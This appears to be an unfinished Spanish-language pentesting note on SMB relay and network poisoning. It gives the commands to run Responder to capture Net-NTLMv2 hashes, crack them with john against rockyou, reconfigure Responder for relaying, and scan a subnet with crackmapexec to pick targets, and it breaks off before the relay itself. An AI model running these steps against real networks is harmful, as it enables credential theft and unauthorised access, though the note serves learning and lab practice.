# ⚠️ EN PROCESO


# SMB relay tipico

Utilizaremos la herramienta Responder.py que encontramos en:
```bash
/usr/share/responder
``` 
> En caso de no tenerlo, podemos descargarlo desde [aqui](https://github.com/lgandx/Responder)

Estando en el directorio anterior podremos modificar la configuracion del responder.py en `Responder.conf` lo dejaremos por defecto. 

Ejecucion de la herramienta:
```bash
python3.9 Responder.py -I eth0 -rdw
```

- `-I` Indicamos la interfaz que usaremos.
- `-rdw`
  -  `r` Habilite las respuestas para las consultas de sufijos wredir de netbios. 
  -  `d` Habilite las respuestas para las consultas de sufijos de dominio netbios.
  -  `w` Iniciar el servidor proxy WPAD


Una vez ejecutada la herramienta estariamos envenenando toda la red. Como samba no esta firmado no se valida la legitimidad del origen. <br>
Por ejemplo, cuando un usuario acceda a un recurso compartido que no existe desde el responder pillamos la comunicacion y de paso el hash `Net-NTLMv2` del usuario.

Una vez obtenido los hashes, los copiamos a un nuevo fichero para luego atacarlos por fuerza bruta de manera offline.
Vamos a crackearlos con john:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes
```

- `--wordlist` Indicamos el diccionario que queremos usar, en nuestro caso, rockyou
- `hashes` Nombre del fichero donde tenemos los hashes copiados.

# Envenenamiento IPV4

Modificamos el `Responder.conf`

```bash
nano /usr/share/responder/Responder.conf 
```

Ponemos en false SMB y HTTP
```bash
[Responder Core]

; Servers to start
SQL = On
SMB = Off <---
RDP = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = Off <---
HTTPS = On
DNS = On
LDAP = On
DCERPC = On
WINRM = On
```

En nuestro directorio de trabajo, creamos un archivo `targets.txt` e indicamos la direccion ip del equipo que queramos atacar. 
Para encontrar la ip utilizaremos crackmapexec:
```bash
crackmapexec smb 10.0.0.0/24
```
- `smb` Indicamos que queremos utilizar el protocolo samba
- `10.0.0.0` Direccion de red que queremos escanear
- `/24` Numero CIDR (mascara de subred), deberia ser 8 pero solo me ha funcionado con /24. 

